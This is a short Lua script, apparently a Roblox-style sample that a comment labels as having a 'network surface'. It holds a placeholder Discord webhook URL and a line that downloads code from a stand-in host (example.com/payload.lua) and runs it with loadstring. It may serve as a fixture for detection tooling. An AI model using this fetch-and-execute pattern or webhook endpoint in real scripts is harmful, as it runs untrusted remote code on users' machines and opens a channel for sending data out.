-- webhook.lua — script with network surface: discord webhook + remote load
local HttpService = game:GetService("HttpService")
local url = "https://discord.com/api/webhooks/123456789012345678/abcdefghijklmnopqrstuvwxyz"
local src = game:HttpGet("https://example.com/payload.lua")
loadstring(src)()
return url
